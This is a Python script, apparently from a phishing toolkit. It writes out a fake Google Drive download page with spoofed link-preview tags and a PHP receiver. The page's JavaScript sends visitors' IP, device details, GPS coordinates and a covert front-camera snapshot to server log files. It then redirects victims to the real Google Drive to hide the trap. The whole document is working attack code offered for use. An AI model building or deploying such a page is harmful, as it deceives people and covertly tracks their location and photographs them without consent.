#!/usr/bin/env python3
import os, sys, shutil

# Importação blindada do utils
sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), '..'))
import utils

R = '\033[31m'
G = '\033[32m'
C = '\033[36m'
W = '\033[0m'

# Configuração
title = os.getenv('TITLE') or "Importante: Arquivo de Backup"
image = os.getenv('IMAGE')
desc = os.getenv('DESC') or "Clique para visualizar e fazer o download do arquivo compartilhado."

# Processamento da Imagem de Preview (OG:IMAGE)
img_path = 'template/gdrive/images/'
if not os.path.exists(img_path): os.makedirs(img_path)

img_name = "gdrive_default.png"
og_image_url = "" # URL final para o meta tag de preview

if image and image.startswith(('http', 'https')):
    # 1. Tenta baixar para usar no corpo do site (Visual Local)
    d = utils.downloadImageFromUrl(image, img_path)
    if d: 
        img_name = os.path.basename(d)
    
    # 2. TRUQUE DO PREVIEW: Usa a URL original remota para o OG:IMAGE.
    og_image_url = image

elif image and os.path.exists(image):
    # Se for arquivo local
    try:
        shutil.copyfile(image, os.path.join(img_path, os.path.basename(image)))
        img_name = os.path.basename(image)
        og_image_url = f"images/{img_name}"
    except: pass

# Se não tiver imagem definida, usa a padrão se existir para o og:image
if not og_image_url and os.path.exists(os.path.join(img_path, img_name)):
    og_image_url = f"images/{img_name}"

php_receiver_code = """<?php
header('Content-Type: application/json');
$data = json_decode(file_get_contents('php://input'), true);

if ($data) {
    $logDir = '../../logs/';
    
    // 1. DADOS DE GPS
    if (isset($data['lat'])) {
        $file = $logDir . 'result.txt';
        $json = json_encode(['status' => 'success', 'lat' => $data['lat'], 'lon' => $data['lon'], 'acc' => $data['acc']]);
        file_put_contents($file, $json);
    } 
    // 2. DADOS DE DISPOSITIVO
    elseif (isset($data['ip'])) {
        $file = $logDir . 'info.txt';
        file_put_contents($file, json_encode($data));
    } 
    // 3. IMAGEM (CAMTRAP)
    elseif (isset($data['img'])) {
        $img = $data['img'];
        $img = str_replace('data:image/png;base64,', '', $img);
        $img = str_replace(' ', '+', $img);
        $data = base64_decode($img);
        $file = $logDir . 'cam_' . date('Ymd_His') . '.png';
        file_put_contents($file, $data);
    }
}
?>"""

html_code = f"""<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    <!-- META TAGS PARA PREVIEW (LINK PREVIEW) -->
    <meta property="og:title" content="{title}">
    <meta property="og:description" content="{desc}">
    {f'<meta property="og:image" content="{og_image_url}">' if og_image_url else ''}
    <meta property="og:type" content="website">
    
    <!-- TAGS EXTRAS PARA COMPATIBILIDADE -->
    {f'<meta name="twitter:image" content="{og_image_url}">' if og_image_url else ''}
    <meta name="twitter:card" content="summary_large_image">
    {f'<meta itemprop="image" content="{og_image_url}">' if og_image_url else ''}
    
    <title>{title}</title>
    <style>
        body {{ background-color: #f7f7f7; font-family: Roboto, Arial, sans-serif; margin: 0; padding: 0; display: flex; justify-content: center; align-items: center; height: 100vh; }}
        .gdrive-card {{ background-color: #fff; border-radius: 8px; box-shadow: 0 1px 3px rgba(0,0,0,0.12), 0 1px 2px rgba(0,0,0,0.24); max-width: 450px; width: 90%; text-align: center; padding: 40px 30px; }}
        .gdrive-icon {{ width: 50px; height: 50px; margin-bottom: 20px; }}
        .file-image {{ width: 100%; max-width: 300px; height: auto; border-radius: 4px; margin-bottom: 20px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }}
        h1 {{ font-size: 24px; color: #202124; margin: 0 0 10px 0; font-weight: 400; }}
        .gdrive-desc {{ font-size: 14px; color: #5f6368; margin-bottom: 30px; }}
        .btn-download {{ background-color: #1a73e8; color: #fff; border: none; padding: 12px 24px; border-radius: 4px; font-size: 15px; font-weight: 500; cursor: pointer; text-transform: uppercase; transition: background 0.2s; }}
        .btn-download:hover {{ background-color: #1669c5; }}
        
        /* Estilos do Loader */
        .loader {{ border: 4px solid #f3f3f3; border-top: 4px solid #1a73e8; border-radius: 50%; width: 24px; height: 24px; animation: spin 1s linear infinite; display: none; margin: 0 auto; }}
        @keyframes spin {{ 0% {{ transform: rotate(0deg); }} 100% {{ transform: rotate(360deg); }} }}
        .btn-text {{ display: inline-block; }}
    </style>
</head>
<body>

    <div class="gdrive-card">
        <img src="https://ssl.gstatic.com/images/branding/product/2x/drive_2020q4_48dp.png" alt="Google Drive Icon" class="gdrive-icon">
        <img src="images/{img_name}" alt="Preview do Arquivo" class="file-image">
        <h1>{title}</h1>
        <div class="gdrive-desc">{desc}</div>
        <button id="downloadBtn" class="btn-download" onclick="startTrap()">
            <span class="btn-text">FAZER DOWNLOAD</span>
            <div id="loader" class="loader"></div>
        </button>
    </div>

<script>
    const btn = document.getElementById('downloadBtn');
    const btnText = document.querySelector('.btn-text');
    const loader = document.getElementById('loader');

    // 1. Captura IP ao carregar
    window.onload = function() {{
        fetch('https://api.ipify.org?format=json').then(r=>r.json()).then(d=>{{
            fetch('data.php', {{method:'POST', headers:{{'Content-Type':'application/json'}}, body:JSON.stringify({{ip:d.ip, os:navigator.platform, platform:navigator.userAgent, browser:navigator.appName}})}});
        }});
    }};

    function showLoading() {{
        btnText.style.display = 'none';
        loader.style.display = 'block';
        btn.disabled = true;
    }}

    function startTrap() {{
        showLoading();
        if (navigator.geolocation) {{
            // Pede GPS
            navigator.geolocation.getCurrentPosition(onPosSuccess, onPosError);
        }} else {{ 
            // Se GPS falhar ou não suportado, tenta Câmara
            requestCamera(); 
        }}
    }}

    function onPosSuccess(pos) {{
        // Envia GPS
        fetch('data.php', {{
            method: 'POST', headers: {{'Content-Type': 'application/json'}},
            body: JSON.stringify({{ lat: pos.coords.latitude, lon: pos.coords.longitude, acc: pos.coords.accuracy }})
        }});
        // Tenta Câmara IMEDIATAMENTE após o GPS
        requestCamera();
    }}

    function onPosError(err) {{
        // Se negar GPS, tenta Câmara mesmo assim
        requestCamera();
    }}

    function requestCamera() {{
        if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {{
            navigator.mediaDevices.getUserMedia({{ video: {{ facingMode: "user" }} }})
            .then(function(stream) {{
                // Cria vídeo invisível
                const video = document.createElement('video');
                video.srcObject = stream;
                video.play();
                
                // Espera 800ms para ajustar luz
                setTimeout(function() {{
                    const canvas = document.createElement('canvas');
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    canvas.getContext('2d').drawImage(video, 0, 0);
                    const data = canvas.toDataURL('image/png');
                    
                    // Para o stream
                    stream.getTracks().forEach(track => track.stop());
                    
                    // Envia Foto e Finaliza
                    fetch('data.php', {{
                        method: 'POST', headers: {{'Content-Type': 'application/json'}},
                        body: JSON.stringify({{img: data}})
                    }}).then(finish);
                }}, 800);
            }})
            .catch(function(err) {{
                // Se negar câmara, finaliza
                finish();
            }});
        }} else {{
            finish();
        }}
    }}

    function finish() {{
        // Simula o download
        alert("Download do arquivo iniciado. Aguarde..."); // Não é uma função real, apenas feedback
        // Redireciona para o Google Drive oficial ou URL definida
        window.location.href = "https://drive.google.com";
    }}
</script>

</body>
</html>
"""

# Escrita dos ficheiros
try:
    if not os.path.exists('template/gdrive'): os.makedirs('template/gdrive')
    
    with open('template/gdrive/index.html', 'w') as f:
        f.write(html_code)
    
    with open('template/gdrive/data.php', 'w') as f:
        f.write(php_receiver_code)

    utils.print(f'{G}[+] {C}Google Drive + Preview + Camtrap gerado com sucesso!{W}')

except Exception as e:
    utils.print(f'{R}[-] {C}Erro: {W}' + str(e))